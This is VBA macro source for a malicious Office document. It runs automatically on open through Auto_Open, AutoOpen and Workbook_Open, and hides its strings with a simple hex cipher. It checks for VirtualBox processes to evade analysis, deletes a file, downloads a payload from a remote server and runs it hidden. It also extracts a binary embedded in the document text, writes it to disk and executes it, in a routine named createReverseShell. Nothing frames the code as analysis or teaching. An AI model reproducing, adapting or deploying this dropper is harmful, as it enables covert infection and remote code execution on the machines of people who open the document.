Sub Auto_Open()
    checkEnv
    Delete_File
    DownloadFile
    createReverseShell
End Sub
'-----------------------------------------------------------------------------


'declare some new functions
Function decryptCipherObj(arg1 As String) As String
    Dim res As String
    Dim c As Integer
    Dim s As String
    Dim cc As Integer
    res = ""


    For i = 1 To Len(arg1) Step 4
        c = CDec("&H" & Mid(arg1, i, 2))
        s = CDec("&H" & Mid(arg1, i + 2, 2))
        cc = c - s
        res = res + Chr(cc)
    Next i
    decryptCipherObj = res
End Function

'-----------------------------------------------------------------------------

Sub createReverseShell()
    Dim Wbldm1 As String
    Dim Wbldm2 As String
    Dim Wbldm3 As Integer
    Dim Wbldm4 As Paragraph
    Dim Wbldm8 As Integer
    Dim Wbldm9 As Boolean
    Dim Wbldm11 As String
    Dim Wbldm6 As Byte
    Dim Gwakocdjva As String
    Dim userEnv As String
    Dim cipherObjArray() As String
    cipherObjArray = Split(F.L, ".")


    userEnv = cipherObjArray(14)
    Gwakocdjva = decryptCipherObj(cipherObjArray(11))
    Wbldm1 = decryptCipherObj(cipherObjArray(15))

    Wbldm2 = Environ(decryptCipherObj(userEnv))
    ChDrive (Wbldm2)
    ChDir (Wbldm2)
    Wbldm3 = FreeFile()
    Open Wbldm1 For Binary As Wbldm3
    For Each Wbldm4 In ActiveDocument.Paragraphs
        DoEvents
            Wbldm11 = Wbldm4.Range.Text
        If (Wbldm9 = True) Then
            Wbldm8 = 1
            While (Wbldm8 < Len(Wbldm11))
                Wbldm6 = Mid(Wbldm11, Wbldm8, 4)
                Put #Wbldm3, , Wbldm6
                Wbldm8 = Wbldm8 + 4
            Wend
        ElseIf (InStr(1, Wbldm11, Gwakocdjva) > 0 And Len(Wbldm11) > 0) Then
            Wbldm9 = True
        End If
    Next
    Close #Wbldm3
    Wbldm13 (Wbldm1)
End Sub

'-----------------------------------------------------------------------------

Sub Wbldm13(Wbldm10 As String)
    Dim Wbldm7 As Integer
    Dim Wbldm2 As String
    Dim cipherObjArray() As String
    cipherObjArray = Split(F.L, ".")

    Wbldm2 = Environ(decryptCipherObj(cipherObjArray(14)))
    ChDrive (Wbldm2)
    ChDir (Wbldm2)
    Wbldm7 = Shell(Wbldm10, vbHide)
End Sub



'-----------------------------------------------------------------------------

Function checkEnv()
    Dim cipherObjArray() As String
    Dim vmwString As String
    Dim vmtString As String
    Dim vboxString As String


    cipherObjArray = Split(F.L, ".")

    vmwString = cipherObjArray(12)
    vmtString = cipherObjArray(13)
    vboxString = cipherObjArray(4)
    Set winMgmt = GetObject(decryptCipherObj(cipherObjArray(2)))
    Set processes = winMgmt.ExecQuery(decryptCipherObj(cipherObjArray(3)), , 48)
    For Each p In processes
        Dim pos As Integer
        pos = InStr(LCase(p.Name), decryptCipherObj(vboxString))
        If pos > 0 Then
            MsgBox decryptCipherObj(cipherObjArray(0)), vbCritical, decryptCipherObj(cipherObjArray(1))
            End
        End If
    Next
End Function

'-------------------------------------------------------'

Sub DownloadFile()
    Dim myURL As String
    Dim x As Variant
    Dim path As String
    Dim remoteServer As String
    Dim file As String
    Dim WinHttpReq As Object
    Dim xmlHttp As String
    Dim getMethod As String
    Dim streamName As String
    Dim cipherObjArray() As String
    
    cipherObjArray = Split(F.L, ".")

    path = decryptCipherObj(cipherObjArray(5))
    remoteServer = decryptCipherObj(cipherObjArray(6))
    file = decryptCipherObj(cipherObjArray(7))
    xmlHttp = decryptCipherObj(cipherObjArray(8))
    getMethod = decryptCipherObj(cipherObjArray(9))
    streamName = decryptCipherObj(cipherObjArray(10))


    myURL = remoteServer & file
    Set WinHttpReq = CreateObject(xmlHttp)
    WinHttpReq.Open getMethod, myURL, False
    WinHttpReq.send

    If WinHttpReq.Status = 200 Then
        Set oStream = CreateObject(streamName)
        oStream.Open
        oStream.Type = 1
        oStream.Write WinHttpReq.responseBody
        oStream.SaveToFile file, 2                  
        oStream.Close
    End If
    x = Shell(path, vbHide)
End Sub

'------------------------------------------------------------------'

Sub Delete_File()
    Dim DeleteFile As String
    Dim cipherObjArray() As String
    cipherObjArray = Split(F.L, ".")
    DeleteFile = decryptCipherObj(cipherObjArray(16))
    If Len(Dir$(DeleteFile)) > 0 Then
        Kill DeleteFile
    End If
End Sub

Sub AutoOpen()
   Auto_Open
End Sub
Sub Workbook_Open()
    Auto_Open
End Sub

